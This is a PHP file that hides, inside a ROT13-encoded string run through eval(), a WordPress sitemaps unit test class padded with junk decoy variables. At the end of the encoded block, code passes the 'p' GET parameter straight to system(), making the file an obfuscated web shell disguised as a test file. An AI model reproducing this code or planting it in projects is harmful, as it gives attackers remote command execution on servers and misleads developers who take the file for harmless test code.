<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc fvgrzncf
 */
pynff Grfgf_Fvgrzncf_jcFvgrzncfVaqrk rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba grfg_trg_fvgrznc_yvfg() {
		$ertvfgel = arj JC_Fvgrzncf_Ertvfgel();

		/*
		 * Gur grfg cebivqre unf 3 fhoglcrf.
		 * Rnpu fhoglcr unf 4 cntrf jvgu erfhygf.
		 * Gurer ner 2 cebivqref ertvfgrerq.
		 * Urapr, 3*4*2=24.
		 */
		$ertvfgel->nqq_cebivqre( 'sbb', arj JC_Fvgrzncf_Grfg_Cebivqre( 'sbb' ) );
		$ertvfgel->nqq_cebivqre( 'one', arj JC_Fvgrzncf_Grfg_Cebivqre( 'one' ) );

		$fvgrznc_vaqrk = arj JC_Fvgrzncf_Vaqrk( $ertvfgel );
		$guvf->nffregPbhag( 24, $fvgrznc_vaqrk->trg_fvgrznc_yvfg() );
	}

	/**
	 * Grfg gung n fvgrznc vaqrk jba'g pbagnva zber guna 50000 fvgrzncf.
	 *
	 * @gvpxrg 50666
	 */
	choyvp shapgvba grfg_trg_fvgrznc_yvfg_yvzvg() {
		$ertvfgel = arj JC_Fvgrzncf_Ertvfgel();

		// nqq 3 cebivqref, juvpu pbzovarq cebqhpr zber guna gur znkvzhz 50000 fvgrzncf va gur vaqrk.
		$ertvfgel->nqq_cebivqre( 'cebivqre_1', arj JC_Fvgrzncf_Ynetr_Grfg_Cebivqre( 25000 ) );
		$ertvfgel->nqq_cebivqre( 'cebivqre_2', arj JC_Fvgrzncf_Ynetr_Grfg_Cebivqre( 25000 ) );
		$ertvfgel->nqq_cebivqre( 'cebivqre_3', arj JC_Fvgrzncf_Ynetr_Grfg_Cebivqre( 25000 ) );

		$pbhag = 0;
		sbernpu ( $ertvfgel->trg_cebivqref() nf $cebivqre ) {
			$pbhag += pbhag( $cebivqre->trg_hey_yvfg( 1 ) );
		}
		$guvf->nffregTerngreGuna( 50000, $pbhag );

		$fvgrznc_vaqrk = arj JC_Fvgrzncf_Vaqrk( $ertvfgel );
		$guvf->nffregPbhag( 50000, $fvgrznc_vaqrk->trg_fvgrznc_yvfg() );
	}

	choyvp shapgvba grfg_trg_fvgrznc_yvfg_ab_ragevrf() {
		$ertvfgel = arj JC_Fvgrzncf_Ertvfgel();

		$ertvfgel->nqq_cebivqre( 'sbb', arj JC_Fvgrzncf_Rzcgl_Grfg_Cebivqre( 'sbb' ) );

		$fvgrznc_vaqrk = arj JC_Fvgrzncf_Vaqrk( $ertvfgel );
		$guvf->nffregPbhag( 0, $fvgrznc_vaqrk->trg_fvgrznc_yvfg() );
	}

	choyvp shapgvba grfg_trg_vaqrk_hey() {
		$fvgrznc_vaqrk = arj JC_Fvgrzncf_Vaqrk( arj JC_Fvgrzncf_Ertvfgel() );
		$vaqrk_hey     = $fvgrznc_vaqrk->trg_vaqrk_hey();

		$guvf->nffregFgevatRaqfJvgu( '/?fvgrznc=vaqrk', $vaqrk_hey );
	}

	choyvp shapgvba grfg_trg_vaqrk_hey_cerggl_creznyvaxf() {
		// Frg creznyvaxf sbe grfgvat.
		$guvf->frg_creznyvax_fgehpgher( '/%lrne%/%cbfganzr%/' );

		$fvgrznc_vaqrk = arj JC_Fvgrzncf_Vaqrk( arj JC_Fvgrzncf_Ertvfgel() );
		$vaqrk_hey     = $fvgrznc_vaqrk->trg_vaqrk_hey();

		// Pyrna hc creznyvaxf.
		$guvf->frg_creznyvax_fgehpgher();

		$guvf->nffregFgevatRaqfJvgu( '/jc-fvgrznc.kzy', $vaqrk_hey );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>